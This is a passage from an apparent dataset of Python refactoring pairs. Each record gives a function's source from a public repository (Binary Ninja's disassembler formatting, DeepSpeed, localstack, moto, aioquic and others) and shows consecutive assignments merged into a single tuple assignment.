					x += len(string)
				elif (instr.operands[j].size == self.addr_size) and (value >= block.exe.start()) and (value < block.exe.end()) and (not self.isLocalJump()):
					# Pointer within module
					if len(result) > 0:
						line += [[result, Qt.black]]
						x += len(result)
						result = """"
					if value in block.exe.symbols_by_addr:
						string = block.exe.symbols_by_addr[value]
					line += [[string, QColor(0, 0, 192)]]
					tokens += [[x, len(string), ""ptr"", value, string]]
					x += len(string)
				else:
					result += string
			elif instr.operands[j].operand == ""mem"":
				plus = False
				result += X86.get_size_string(instr.operands[j].size)
				if (instr.segment != None) or (instr.operands[j].segment == ""es""):
					result += instr.operands[j].segment + "":""
				result += '['
				if instr.operands[j].components[0] != None:
					tokens += [[x + len(result), len(instr.operands[j].components[0]), ""reg"", instr.operands[j].components[0]]]
					result += instr.operands[j].components[0]
					plus = True
				if instr.operands[j].components[1] != None:
					if plus:
						tokens += [[x + len(result) + 1, len(instr.operands[j].components[1]), ""reg"", instr.operands[j].components[1]]]
					else:
						tokens += [[x + len(result), len(instr.operands[j].components[1]), ""reg"", instr.operands[j].components[1]]]
					result += X86.get_operand_string(instr.operands[j].components[1],
						instr.operands[j].scale, plus)
					plus = True
				if (instr.operands[j].immediate != 0) or ((instr.operands[j].components[0] == None) and (instr.operands[j].components[1] == None)):
					if plus and (instr.operands[j].immediate >= -0x80) and (instr.operands[j].immediate < 0):
						result += '-'
						result += ""0x%.2x"" % (-instr.operands[j].immediate)
					elif plus and (instr.operands[j].immediate > 0) and (instr.operands[j].immediate <= 0x7f):
						result += '+'
						result += ""0x%.2x"" % instr.operands[j].immediate
					elif plus and (instr.operands[j].immediate >= -0x8000) and (instr.operands[j].immediate < 0):
						result += '-'
						result += ""0x%.8x"" % (-instr.operands[j].immediate)
					elif instr.flags & X86.FLAG_64BIT_ADDRESS:
						if plus:
							result += '+'
						value = instr.operands[j].immediate
						string = ""0x%.16x"" % instr.operands[j].immediate
						if hasattr(block.exe, ""plt"") and block.exe.plt.has_key(value):
							# Pointer to PLT entry
							self.plt = block.exe.plt[value]
							if len(result) > 0:
								line += [[result, Qt.black]]
								x += len(result)
								result = """"
							string = self.plt + ""@PLT""
							line += [[string, QColor(0, 0, 192)]]
							tokens += [[x, len(string), ""ptr"", value, string]]
							x += len(string)
						elif (value >= block.exe.start()) and (value < block.exe.end()):
							# Pointer within module
							if len(result) > 0:
								line += [[result, Qt.black]]
								x += len(result)
								result = """"
							if value in block.exe.symbols_by_addr:
								string = block.exe.symbols_by_addr[value]
							line += [[string, QColor(0, 0, 192)]]
							tokens += [[x, len(string), ""ptr"", value, string]]
							x += len(string)
						else:
							result += string
					else:
						if plus:
							result += '+'
						value = instr.operands[j].immediate & 0xffffffff
						string = ""0x%.8x"" % value
						if (self.addr_size == 4) and hasattr(block.exe, ""plt"") and block.exe.plt.has_key(value):
							# Pointer to PLT entry
							self.plt = block.exe.plt[value]
							if len(result) > 0:
								line += [[result, Qt.black]]
								x += len(result)
								result = """"
							string = block.exe.decorate_plt_name(self.plt)
							line += [[string, QColor(0, 0, 192)]]
							tokens += [[x, len(string), ""ptr"", value, string]]
							x += len(string)
						elif (self.addr_size == 4) and (value >= block.exe.start()) and (value < block.exe.end()):
							# Pointer within module
							if len(result) > 0:
								line += [[result, Qt.black]]
								x += len(result)
								result = """"
							if value in block.exe.symbols_by_addr:
								string = block.exe.symbols_by_addr[value]
							line += [[string, QColor(0, 0, 192)]]
							tokens += [[x, len(string), ""ptr"", value, string]]
							x += len(string)
						else:
							result += string
				result += ']'
			else:
				tokens += [[x + len(result), len(instr.operands[j].operand), ""reg"", instr.operands[j].operand]]
				result += instr.operands[j].operand

		if len(result) > 0:
			line += [[result, Qt.black]]
		self.text.lines += [line]
		self.text.tokens += [tokens]

		return (old_lines != self.text.lines) or (old_tokens != self.text.tokens)","result = ''
operation = ''","result , operation  = '', ''"
deprecated-binaryninja-python,https://github.com/Vector35/deprecated-binaryninja-python/tree/master//Analysis.py,X86Instruction,format_text$82,"def format_text(self, block, options):
		old_lines = []
		old_tokens = []
		self.text.lines = []
		self.text.tokens = []

		line = []
		tokens = []
		x = 0
		instr = self.disasm

		if ""address"" in options:
			string = ""%.8x   "" % self.addr
			line += [[string, QColor(0, 0, 128)]]
			x += len(string)

		if instr.operation == None:
			line += [[""??"", Qt.black]]
			self.text.lines += [line]
			self.text.tokens += [tokens]
			return (old_lines != self.text.lines) or (old_tokens != self.text.tokens)

		result = """"
		operation = """"
		if instr.flags & X86.FLAG_LOCK:
			operation += ""lock ""
		if instr.flags & X86.FLAG_ANY_REP:
			operation += ""rep""
			if instr.flags & X86.FLAG_REPNE:
				operation += ""ne""
			elif instr.flags & X86.FLAG_REPE:
				operation += ""e""
			operation += "" ""
		operation += instr.operation
		if len(operation) < 7:
			operation += "" "" * (7 - len(operation))
		result += operation + "" ""

		for j in range(0, len(instr.operands)):
			if j != 0:
				result += "", ""
			if instr.operands[j].operand == ""imm"":
				value = instr.operands[j].immediate & ((1 << (instr.operands[j].size * 8)) - 1)
				numfmt = ""0x%%.%dx"" % (instr.operands[j].size * 2)
				string = numfmt % value
				if (instr.operands[j].size == self.addr_size) and (block.analysis.functions.has_key(value)):
					# Pointer to existing function
					func = block.analysis.functions[value]
					string = func.name
					if func.plt:
						color = QColor(192, 0, 192)
					else:
						color = QColor(0, 0, 192)
					if len(result) > 0:
						line += [[result, Qt.black]]
						x += len(result)
						result = """"
					line += [[string, color]]
					tokens += [[x, len(string), ""ptr"", value, string]]
					x += len(string)
				elif (instr.operands[j].size == self.addr_size) and (value >= block.exe.start()) and (value < block.exe.end()) and (not self.isLocalJump()):
					# Pointer within module
					if len(result) > 0:
						line += [[result, Qt.black]]
						x += len(result)
						result = """"
					if value in block.exe.symbols_by_addr:
						string = block.exe.symbols_by_addr[value]
					line += [[string, QColor(0, 0, 192)]]
					tokens += [[x, len(string), ""ptr"", value, string]]
					x += len(string)
				else:
					result += string
			elif instr.operands[j].operand == ""mem"":
				plus = False
				result += X86.get_size_string(instr.operands[j].size)
				if (instr.segment != None) or (instr.operands[j].segment == ""es""):
					result += instr.operands[j].segment + "":""
				result += '['
				if instr.operands[j].components[0] != None:
					tokens += [[x + len(result), len(instr.operands[j].components[0]), ""reg"", instr.operands[j].components[0]]]
					result += instr.operands[j].components[0]
					plus = True
				if instr.operands[j].components[1] != None:
					if plus:
						tokens += [[x + len(result) + 1, len(instr.operands[j].components[1]), ""reg"", instr.operands[j].components[1]]]
					else:
						tokens += [[x + len(result), len(instr.operands[j].components[1]), ""reg"", instr.operands[j].components[1]]]
					result += X86.get_operand_string(instr.operands[j].components[1],
						instr.operands[j].scale, plus)
					plus = True
				if (instr.operands[j].immediate != 0) or ((instr.operands[j].components[0] == None) and (instr.operands[j].components[1] == None)):
					if plus and (instr.operands[j].immediate >= -0x80) and (instr.operands[j].immediate < 0):
						result += '-'
						result += ""0x%.2x"" % (-instr.operands[j].immediate)
					elif plus and (instr.operands[j].immediate > 0) and (instr.operands[j].immediate <= 0x7f):
						result += '+'
						result += ""0x%.2x"" % instr.operands[j].immediate
					elif plus and (instr.operands[j].immediate >= -0x8000) and (instr.operands[j].immediate < 0):
						result += '-'
						result += ""0x%.8x"" % (-instr.operands[j].immediate)
					elif instr.flags & X86.FLAG_64BIT_ADDRESS:
						if plus:
							result += '+'
						value = instr.operands[j].immediate
						string = ""0x%.16x"" % instr.operands[j].immediate
						if hasattr(block.exe, ""plt"") and block.exe.plt.has_key(value):
							# Pointer to PLT entry
							self.plt = block.exe.plt[value]
							if len(result) > 0:
								line += [[result, Qt.black]]
								x += len(result)
								result = """"
							string = self.plt + ""@PLT""
							line += [[string, QColor(0, 0, 192)]]
							tokens += [[x, len(string), ""ptr"", value, string]]
							x += len(string)
						elif (value >= block.exe.start()) and (value < block.exe.end()):
							# Pointer within module
							if len(result) > 0:
								line += [[result, Qt.black]]
								x += len(result)
								result = """"
							if value in block.exe.symbols_by_addr:
								string = block.exe.symbols_by_addr[value]
							line += [[string, QColor(0, 0, 192)]]
							tokens += [[x, len(string), ""ptr"", value, string]]
							x += len(string)
						else:
							result += string
					else:
						if plus:
							result += '+'
						value = instr.operands[j].immediate & 0xffffffff
						string = ""0x%.8x"" % value
						if (self.addr_size == 4) and hasattr(block.exe, ""plt"") and block.exe.plt.has_key(value):
							# Pointer to PLT entry
							self.plt = block.exe.plt[value]
							if len(result) > 0:
								line += [[result, Qt.black]]
								x += len(result)
								result = """"
							string = block.exe.decorate_plt_name(self.plt)
							line += [[string, QColor(0, 0, 192)]]
							tokens += [[x, len(string), ""ptr"", value, string]]
							x += len(string)
						elif (self.addr_size == 4) and (value >= block.exe.start()) and (value < block.exe.end()):
							# Pointer within module
							if len(result) > 0:
								line += [[result, Qt.black]]
								x += len(result)
								result = """"
							if value in block.exe.symbols_by_addr:
								string = block.exe.symbols_by_addr[value]
							line += [[string, QColor(0, 0, 192)]]
							tokens += [[x, len(string), ""ptr"", value, string]]
							x += len(string)
						else:
							result += string
				result += ']'
			else:
				tokens += [[x + len(result), len(instr.operands[j].operand), ""reg"", instr.operands[j].operand]]
				result += instr.operands[j].operand

		if len(result) > 0:
			line += [[result, Qt.black]]
		self.text.lines += [line]
		self.text.tokens += [tokens]

		return (old_lines != self.text.lines) or (old_tokens != self.text.tokens)","value = instr.operands[j].immediate & (1 << instr.operands[j].size * 8) - 1
numfmt = '0x%%.%dx' % (instr.operands[j].size * 2)","value , numfmt  = instr.operands[j].immediate & (1 << instr.operands[j].size * 8) - 1, '0x%%.%dx' % (instr.operands[j].size * 2)"
deprecated-binaryninja-python,https://github.com/Vector35/deprecated-binaryninja-python/tree/master//Analysis.py,X86Instruction,format_text$82,"def format_text(self, block, options):
		old_lines = []
		old_tokens = []
		self.text.lines = []
		self.text.tokens = []

		line = []
		tokens = []
		x = 0
		instr = self.disasm

		if ""address"" in options:
			string = ""%.8x   "" % self.addr
			line += [[string, QColor(0, 0, 128)]]
			x += len(string)

		if instr.operation == None:
			line += [[""??"", Qt.black]]
			self.text.lines += [line]
			self.text.tokens += [tokens]
			return (old_lines != self.text.lines) or (old_tokens != self.text.tokens)

		result = """"
		operation = """"
		if instr.flags & X86.FLAG_LOCK:
			operation += ""lock ""
		if instr.flags & X86.FLAG_ANY_REP:
			operation += ""rep""
			if instr.flags & X86.FLAG_REPNE:
				operation += ""ne""
			elif instr.flags & X86.FLAG_REPE:
				operation += ""e""
			operation += "" ""
		operation += instr.operation
		if len(operation) < 7:
			operation += "" "" * (7 - len(operation))
		result += operation + "" ""

		for j in range(0, len(instr.operands)):
			if j != 0:
				result += "", ""
			if instr.operands[j].operand == ""imm"":
				value = instr.operands[j].immediate & ((1 << (instr.operands[j].size * 8)) - 1)
				numfmt = ""0x%%.%dx"" % (instr.operands[j].size * 2)
				string = numfmt % value
				if (instr.operands[j].size == self.addr_size) and (block.analysis.functions.has_key(value)):
					# Pointer to existing function
					func = block.analysis.functions[value]
					string = func.name
					if func.plt:
						color = QColor(192, 0, 192)
					else:
						color = QColor(0, 0, 192)
					if len(result) > 0:
						line += [[result, Qt.black]]
						x += len(result)
						result = """"
					line += [[string, color]]
					tokens += [[x, len(string), ""ptr"", value, string]]
					x += len(string)
				elif (instr.operands[j].size == self.addr_size) and (value >= block.exe.start()) and (value < block.exe.end()) and (not self.isLocalJump()):
					# Pointer within module
					if len(result) > 0:
						line += [[result, Qt.black]]
						x += len(result)
						result = """"
					if value in block.exe.symbols_by_addr:
						string = block.exe.symbols_by_addr[value]
					line += [[string, QColor(0, 0, 192)]]
					tokens += [[x, len(string), ""ptr"", value, string]]
					x += len(string)
				else:
					result += string
			elif instr.operands[j].operand == ""mem"":
				plus = False
				result += X86.get_size_string(instr.operands[j].size)
				if (instr.segment != None) or (instr.operands[j].segment == ""es""):
					result += instr.operands[j].segment + "":""
				result += '['
				if instr.operands[j].components[0] != None:
					tokens += [[x + len(result), len(instr.operands[j].components[0]), ""reg"", instr.operands[j].components[0]]]
					result += instr.operands[j].components[0]
					plus = True
				if instr.operands[j].components[1] != None:
					if plus:
						tokens += [[x + len(result) + 1, len(instr.operands[j].components[1]), ""reg"", instr.operands[j].components[1]]]
					else:
						tokens += [[x + len(result), len(instr.operands[j].components[1]), ""reg"", instr.operands[j].components[1]]]
					result += X86.get_operand_string(instr.operands[j].components[1],
						instr.operands[j].scale, plus)
					plus = True
				if (instr.operands[j].immediate != 0) or ((instr.operands[j].components[0] == None) and (instr.operands[j].components[1] == None)):
					if plus and (instr.operands[j].immediate >= -0x80) and (instr.operands[j].immediate < 0):
						result += '-'
						result += ""0x%.2x"" % (-instr.operands[j].immediate)
					elif plus and (instr.operands[j].immediate > 0) and (instr.operands[j].immediate <= 0x7f):
						result += '+'
						result += ""0x%.2x"" % instr.operands[j].immediate
					elif plus and (instr.operands[j].immediate >= -0x8000) and (instr.operands[j].immediate < 0):
						result += '-'
						result += ""0x%.8x"" % (-instr.operands[j].immediate)
					elif instr.flags & X86.FLAG_64BIT_ADDRESS:
						if plus:
							result += '+'
						value = instr.operands[j].immediate
						string = ""0x%.16x"" % instr.operands[j].immediate
						if hasattr(block.exe, ""plt"") and block.exe.plt.has_key(value):
							# Pointer to PLT entry
							self.plt = block.exe.plt[value]
							if len(result) > 0:
								line += [[result, Qt.black]]
								x += len(result)
								result = """"
							string = self.plt + ""@PLT""
							line += [[string, QColor(0, 0, 192)]]
							tokens += [[x, len(string), ""ptr"", value, string]]
							x += len(string)
						elif (value >= block.exe.start()) and (value < block.exe.end()):
							# Pointer within module
							if len(result) > 0:
								line += [[result, Qt.black]]
								x += len(result)
								result = """"
							if value in block.exe.symbols_by_addr:
								string = block.exe.symbols_by_addr[value]
							line += [[string, QColor(0, 0, 192)]]
							tokens += [[x, len(string), ""ptr"", value, string]]
							x += len(string)
						else:
							result += string
					else:
						if plus:
							result += '+'
						value = instr.operands[j].immediate & 0xffffffff
						string = ""0x%.8x"" % value
						if (self.addr_size == 4) and hasattr(block.exe, ""plt"") and block.exe.plt.has_key(value):
							# Pointer to PLT entry
							self.plt = block.exe.plt[value]
							if len(result) > 0:
								line += [[result, Qt.black]]
								x += len(result)
								result = """"
							string = block.exe.decorate_plt_name(self.plt)
							line += [[string, QColor(0, 0, 192)]]
							tokens += [[x, len(string), ""ptr"", value, string]]
							x += len(string)
						elif (self.addr_size == 4) and (value >= block.exe.start()) and (value < block.exe.end()):
							# Pointer within module
							if len(result) > 0:
								line += [[result, Qt.black]]
								x += len(result)
								result = """"
							if value in block.exe.symbols_by_addr:
								string = block.exe.symbols_by_addr[value]
							line += [[string, QColor(0, 0, 192)]]
							tokens += [[x, len(string), ""ptr"", value, string]]
							x += len(string)
						else:
							result += string
				result += ']'
			else:
				tokens += [[x + len(result), len(instr.operands[j].operand), ""reg"", instr.operands[j].operand]]
				result += instr.operands[j].operand

		if len(result) > 0:
			line += [[result, Qt.black]]
		self.text.lines += [line]
		self.text.tokens += [tokens]

		return (old_lines != self.text.lines) or (old_tokens != self.text.tokens)","value = instr.operands[j].immediate
string = '0x%.16x' % instr.operands[j].immediate","value , string  = instr.operands[j].immediate, '0x%.16x' % instr.operands[j].immediate"
DeepSpeed,https://github.com/microsoft/DeepSpeed/tree/master/deepspeed/runtime/zero/partition_parameters.py,InsertPostInitMethodToModuleSubClasses,__init__$251,"def __init__(self,
                 enabled=True,
                 mem_efficient_linear=True,
                 ds_config=None,
                 dtype=None):
        self.mem_efficient_linear = mem_efficient_linear
        self.enabled = enabled
        self._set_dtype(ds_config, dtype)
        assert self.dtype in [torch.half, torch.bfloat16, torch.float], f""Invalid data type {self.dtype}, allowed values are [torch.half, torch.bfloat16, torch.float]""","self.mem_efficient_linear = mem_efficient_linear
self.enabled = enabled","self.mem_efficient_linear , self.enabled  = mem_efficient_linear, enabled"
rotki,https://github.com/rotki/rotki/tree/master/rotkehlchen/tests/api/test_balances.py,,test_ethereum_tokens_detection$818,"def test_ethereum_tokens_detection(
        rotkehlchen_api_server,
        ethereum_accounts,
):
    account = ethereum_accounts[0]

    def query_detect_eth_tokens() -> Dict[str, Any]:
        response = requests.post(
            api_url_for(
                rotkehlchen_api_server,
                'detecttokensresource',
                blockchain='ETH',
            ), json={
                'async_query': False,
                'only_cache': True,
                'addresses': ethereum_accounts,
            },
        )
        return assert_proper_response_with_result(response)

    empty_tokens_result = {
        account: {
            'tokens': None,
            'last_update_timestamp': None,
        },
    }
    assert query_detect_eth_tokens() == empty_tokens_result

    db = rotkehlchen_api_server.rest_api.rotkehlchen.data.db
    with db.user_write() as write_cursor:
        db.save_tokens_for_address(
            write_cursor=write_cursor,
            address=account,
            blockchain=SupportedBlockchain.ETHEREUM,
            tokens=[A_RDN, A_DAI],
        )
    cur_time = ts_now()
    result = query_detect_eth_tokens()
    assert set(result[account]['tokens']) == {A_DAI.identifier, A_RDN.identifier}
    assert result[account]['last_update_timestamp'] >= cur_time","cur_time = ts_now()
result = query_detect_eth_tokens()","cur_time , result  = ts_now(), query_detect_eth_tokens()"
oppia,https://github.com/oppia/oppia/tree/master/scripts/linters/js_ts_linter_test.py,JsTsLintTests,test_third_party_linter_with_stderr$192,"def test_third_party_linter_with_stderr(self) -> None:
        process = subprocess.Popen(['test'], stdout=subprocess.PIPE)
        def mock_popen(
            unused_cmd: str, stdout: int, stderr: int  # pylint: disable=unused-argument
        ) -> subprocess.Popen[bytes]:  # pylint: disable=unsubscriptable-object
            return process
        def mock_communicate(unused_self: str) -> Tuple[bytes, bytes]:
            return (b'Output', b'Invalid')
        popen_swap = self.swap(subprocess, 'Popen', mock_popen)
        communicate_swap = self.swap(
            subprocess.Popen, 'communicate', mock_communicate)
        with popen_swap, communicate_swap:
            with self.assertRaisesRegex(Exception, 'Invalid'):
                js_ts_linter.ThirdPartyJsTsLintChecksManager(
                    [INVALID_SORTED_DEPENDENCIES_FILEPATH]
                ).perform_all_lint_checks()","popen_swap = self.swap(subprocess, 'Popen', mock_popen)
communicate_swap = self.swap(subprocess.Popen, 'communicate', mock_communicate)","popen_swap , communicate_swap  = self.swap(subprocess, 'Popen', mock_popen), self.swap(subprocess.Popen, 'communicate', mock_communicate)"
Hardware-Target-Game-Database,https://github.com/frederic-mahe/Hardware-Target-Game-Database/tree/master//verify_pack.py,,if_main_my$172,"if __name__ == '__main__':
    TARGET_FOLDER = ARGS.target_folder
    TARGET_DATABASE = ARGS.target_database
    MISMATCH_FILES = ARGS.mismatch_files
    END_LINE = ""\n"" if ARGS.new_line else ""\r""
    DROP_INITIAL_DIRECTORY = ARGS.drop_initial_directory

    DATABASE, NUMBER_OF_ENTRIES = parse_database(TARGET_DATABASE,
                                                 DROP_INITIAL_DIRECTORY)
    BAD_LOCATION_FILES, EXTRA_FILES = parse_folder(TARGET_FOLDER, DATABASE)

    MISSING_FILES = []
    for key in DATABASE:
        for file in DATABASE[key]:
            MISSING_FILES.append((file, key))

    # write information to log file only if there are any bad, extra
    # or missing files to report
    if MISMATCH_FILES and (BAD_LOCATION_FILES or EXTRA_FILES or MISSING_FILES):
        BAD_LOCATION_FILES.sort()
        EXTRA_FILES.sort()
        MISSING_FILES.sort()

        with open(MISMATCH_FILES, ""w"") as mismatch_files:
            if BAD_LOCATION_FILES:
                print(""Incorrect Location Files:"", file=mismatch_files)
                for file, hash_sha256 in BAD_LOCATION_FILES:
                    print(os.path.abspath(file), hash_sha256,
                          sep=""\t"", file=mismatch_files)
                print(""\n"", file=mismatch_files)

            if EXTRA_FILES:
                print(""Extra Files:"", file=mismatch_files)
                for file, hash_sha256 in EXTRA_FILES:
                    print(os.path.abspath(file), hash_sha256,
                          sep=""\t"", file=mismatch_files)
                print(""\n"", file=mismatch_files)

            if MISSING_FILES:
                print(""Missing Files:"", file=mismatch_files)
                for file, hash_sha256 in MISSING_FILES:
                    print(file, hash_sha256, sep=""\t"", file=mismatch_files)
                print(""\n"", file=mismatch_files)

    print(""incorrect location: {}"".format(len(BAD_LOCATION_FILES)),
          file=sys.stdout)
    print(""extra: {}"".format(len(EXTRA_FILES)), file=sys.stdout)
    print(""missing: {}"".format(len(MISSING_FILES)), file=sys.stdout)

    sys.exit(0)","TARGET_FOLDER = ARGS.target_folder
TARGET_DATABASE = ARGS.target_database
MISMATCH_FILES = ARGS.mismatch_files
END_LINE = '\n' if ARGS.new_line else '\r'
DROP_INITIAL_DIRECTORY = ARGS.drop_initial_directory","TARGET_FOLDER , TARGET_DATABASE , MISMATCH_FILES , END_LINE , DROP_INITIAL_DIRECTORY  = ARGS.target_folder, ARGS.target_database, ARGS.mismatch_files, '\n' if ARGS.new_line else '\r', ARGS.drop_initial_directory"
localstack,https://github.com/localstack/localstack/tree/master/localstack/utils/server/proxy_server.py,,_do_start_ssl_proxy$115,"def _do_start_ssl_proxy(port: int, target: str, target_ssl=False):
    import pproxy

    from localstack.services.generic_proxy import GenericProxy

    if "":"" not in str(target):
        target = ""127.0.0.1:%s"" % target
    LOG.debug(""Starting SSL proxy server %s -> %s"" % (port, target))

    # create server and remote connection
    server = pproxy.Server(""secure+tunnel://0.0.0.0:%s"" % port)
    target_proto = ""ssl+tunnel"" if target_ssl else ""tunnel""
    remote = pproxy.Connection(""%s://%s"" % (target_proto, target))
    args = dict(rserver=[remote], verbose=print)

    # set SSL contexts
    _, cert_file_name, key_file_name = GenericProxy.create_ssl_cert()
    for context in pproxy.server.sslcontexts:
        context.load_cert_chain(cert_file_name, key_file_name)

    loop = ensure_event_loop()
    handler = loop.run_until_complete(server.start_server(args))
    try:
        loop.run_forever()
    except KeyboardInterrupt:
        print(""exit!"")

    handler.close()
    loop.run_until_complete(handler.wait_closed())
    loop.run_until_complete(loop.shutdown_asyncgens())
    loop.close()","server = pproxy.Server('secure+tunnel://0.0.0.0:%s' % port)
target_proto = 'ssl+tunnel' if target_ssl else 'tunnel'","server , target_proto  = pproxy.Server('secure+tunnel://0.0.0.0:%s' % port), 'ssl+tunnel' if target_ssl else 'tunnel'"
moto,https://github.com/spulec/moto/tree/master/tests/test_logs/test_logs.py,,test_put_metric_filters_validation$93,"def test_put_metric_filters_validation():
    conn = boto3.client(""logs"", ""us-west-2"")

    invalid_filter_name = ""X"" * 513
    invalid_filter_pattern = ""X"" * 1025
    invalid_metric_transformations = [
        {
            ""defaultValue"": 1,
            ""metricName"": ""metricName"",
            ""metricNamespace"": ""metricNamespace"",
            ""metricValue"": ""metricValue"",
        },
        {
            ""defaultValue"": 1,
            ""metricName"": ""metricName"",
            ""metricNamespace"": ""metricNamespace"",
            ""metricValue"": ""metricValue"",
        },
    ]

    test_cases = [
        build_put_case(name=""Invalid filter name"", filter_name=invalid_filter_name,),
        build_put_case(
            name=""Invalid filter pattern"", filter_pattern=invalid_filter_pattern,
        ),
        build_put_case(
            name=""Invalid filter metric transformations"",
            metric_transformations=invalid_metric_transformations,
        ),
    ]

    for test_case in test_cases:
        with pytest.raises(ClientError) as exc:
            conn.put_metric_filter(**test_case[""input""])
        response = exc.value.response
        response[""ResponseMetadata""][""HTTPStatusCode""].should.equal(400)
        response[""Error""][""Code""].should.equal(""InvalidParameterException"")","conn = boto3.client('logs', 'us-west-2')
invalid_filter_name = 'X' * 513
invalid_filter_pattern = 'X' * 1025
invalid_metric_transformations = [{'defaultValue': 1, 'metricName': 'metricName', 'metricNamespace': 'metricNamespace', 'metricValue': 'metricValue'}, {'defaultValue': 1, 'metricName': 'metricName', 'metricNamespace': 'metricNamespace', 'metricValue': 'metricValue'}]","conn , invalid_filter_name , invalid_filter_pattern , invalid_metric_transformations  = boto3.client('logs', 'us-west-2'), 'X' * 513, 'X' * 1025, [{'defaultValue': 1, 'metricName': 'metricName', 'metricNamespace': 'metricNamespace', 'metricValue': 'metricValue'}, {'defaultValue': 1, 'metricName': 'metricName', 'metricNamespace': 'metricNamespace', 'metricValue': 'metricValue'}]"
imaginaire,https://github.com/NVlabs/imaginaire/tree/master/imaginaire/datasets/paired_videos.py,Dataset,_create_mapping$116,"def _create_mapping(self):
        r""""""Creates mapping from idx to key in LMDB.

        Returns:
            (tuple):
              - self.mapping (dict): Dict of seq_len to list of sequences.
              - self.epoch_length (int): Number of samples in an epoch.
        """"""
        # Create dict mapping length to sequence.
        length_to_key, num_selected_seq = {}, 0
        total_num_of_frames = 0
        for lmdb_idx, sequence_list in enumerate(self.sequence_lists):
            for sequence_name, filenames in sequence_list.items():
                if len(filenames) >= self.sequence_length:
                    total_num_of_frames += len(filenames)
                    if len(filenames) not in length_to_key:
                        length_to_key[len(filenames)] = []
                    length_to_key[len(filenames)].append({
                        'lmdb_root': self.lmdb_roots[lmdb_idx],
                        'lmdb_idx': lmdb_idx,
                        'sequence_name': sequence_name,
                        'filenames': filenames,
                    })
                    num_selected_seq += 1
        self.mapping = length_to_key
        self.epoch_length = num_selected_seq
        if not self.is_inference and self.epoch_length < \
                self.cfgdata.train.batch_size * 8:
            self.epoch_length = total_num_of_frames

        # At inference time, we want to use all sequences,
        # irrespective of length.
        if self.is_inference:
            sequence_list = []
            for key, sequences in self.mapping.items():
                sequence_list.extend(sequences)
            self.mapping = sequence_list

        return self.mapping, self.epoch_length","self.mapping = length_to_key
self.epoch_length = num_selected_seq","self.mapping , self.epoch_length  = length_to_key, num_selected_seq"
aioquic,https://github.com/aiortc/aioquic/tree/master/src/aioquic/quic/connection.py,QuicConnection,_handle_max_stream_data_frame$1680,"def _handle_max_stream_data_frame(
        self, context: QuicReceiveContext, frame_type: int, buf: Buffer
    ) -> None:
        """"""
        Handle a MAX_STREAM_DATA frame.

        This adjusts the amount of data we can send on a specific stream.
        """"""
        stream_id = buf.pull_uint_var()
        max_stream_data = buf.pull_uint_var()

        # log frame
        if self._quic_logger is not None:
            context.quic_logger_frames.append(
                self._quic_logger.encode_max_stream_data_frame(
                    maximum=max_stream_data, stream_id=stream_id
                )
            )

        # check stream direction
        self._assert_stream_can_send(frame_type, stream_id)

        stream = self._get_or_create_stream(frame_type, stream_id)
        if max_stream_data > stream.max_stream_data_remote:
            self._logger.debug(
                ""Stream %d remote max_stream_data raised to %d"",
                stream_id,
                max_stream_data,
            )
            stream.max_stream_data_remote = max_stream_data","stream_id = buf.pull_uint_var()
max_stream_data = buf.pull_uint_var()","stream_id , max_stream_data  = buf.pull_uint_var(), buf.pull_uint_var()"
imageio,https://github.com/imageio/imageio/tree/master/tests/test_pillow.py,,test_gif_rgb_vs_rgba$225,"def test_gif_rgb_vs_rgba(test_images):
    # Note: I don't understand the point of this test
    im_rgb = iio.imread(
        test_images / ""newtonscradle.gif"",
        plugin=""pillow"",
        mode=""RGB"",
    )
    im_rgba = iio.imread(
        test_images / ""newtonscradle.gif"",
        plugin=""pillow"",
        mode=""RGBA"",
    )

    assert np.allclose(im_rgb, im_rgba[..., :3])","im_rgb = iio.imread(test_images / 'newtonscradle.gif', plugin='pillow', mode='RGB')
im_rgba = iio.imread(test_images / 'newtonscradle.gif', plugin='pillow', mode='RGBA')","im_rgb , im_rgba  = iio.imread(test_images / 'newtonscradle.gif', plugin='pillow', mode='RGB'), iio.imread(test_images / 'newtonscradle.gif', plugin='pillow', mode='RGBA')"
model_search,https://github.com/google/model_search/tree/master/model_search/search/categorical_harmonica_test.py,HarmonicaTest,test_extract_relevant_variables_indices$291,"def test_extract_relevant_variables_indices(self):
    algorithm = categorical_harmonica.Harmonica(
        test_utils.create_spec(
            phoenix_spec_pb2.PhoenixSpec.CNN,
            blocks_to_use=[
                ""FIXED_CHANNEL_CONVOLUTION_16"", ""FIXED_CHANNEL_CONVOLUTION_32"",
                ""FIXED_CHANNEL_CONVOLUTION_64"", ""CONVOLUTION_3X3""
            ],
            min_depth=4),
        degree=2)
    feature_extender = PolynomialFeatures(2, interaction_only=True)
    algorithm._get_polynomial_expansion(feature_extender,
                                        np.array([[1, 2, 3, 4]]))
    output = algorithm._extract_relevant_variables_indices(
        feature_extender, np.array([1, 1, 1] + [0] * 7 + [1]))
    logging.info(output)
    self.assertAllEqual(output, set([0, 1, 2, 3]))
    output = algorithm._extract_relevant_variables_indices(
        feature_extender, np.array([1, 0, 0] + [0] * 7 + [1]))
    self.assertAllEqual(output, set([2, 3]))
    output = algorithm._extract_relevant_variables_indices(
        feature_extender, np.array([1, 0, 0] + [0] * 7 + [0]))
    self.assertEmpty(output)","algorithm = categorical_harmonica.Harmonica(test_utils.create_spec(phoenix_spec_pb2.PhoenixSpec.CNN, blocks_to_use=['FIXED_CHANNEL_CONVOLUTION_16', 'FIXED_CHANNEL_CONVOLUTION_32', 'FIXED_CHANNEL_CONVOLUTION_64', 'CONVOLUTION_3X3'], min_depth=4), degree=2)
feature_extender = PolynomialFeatures(2, interaction_only=True)","algorithm , feature_extender  = categorical_harmonica.Harmonica(test_utils.create_spec(phoenix_spec_pb2.PhoenixSpec.CNN, blocks_to_use=['FIXED_CHANNEL_CONVOLUTION_16', 'FIXED_CHANNEL_CONVOLUTION_32', 'FIXED_CHANNEL_CONVOLUTION_64', 'CONVOLUTION_3X3'], min_depth=4), degree=2), PolynomialFeatures(2, interaction_only=True)"
django-anymail,https://github.com/anymail/django-anymail/tree/master/tests/test_mandrill_backend.py,MandrillBackendStandardEmailTests,test_attachments$140,"def test_attachments(self):
        text_content = ""* Item one\n* Item two\n* Item three""
        self.message.attach(filename=""test.txt"", content=text_content, mimetype=""text/plain"")

        # Should guess mimetype if not provided...
        png_content = b""PNG\xb4 pretend this is the contents of a png file""
        self.message.attach(filename=""test.png"", content=png_content)

        # Should work with a MIMEBase object (also tests no filename)...
        pdf_content = b""PDF\xb4 pretend this is valid pdf data""
        mimeattachment = MIMEBase('application', 'pdf')
        mimeattachment.set_payload(pdf_content)
        self.message.attach(mimeattachment)

        self.message.send()
        data = self.get_api_call_json()
        attachments = data['message']['attachments']
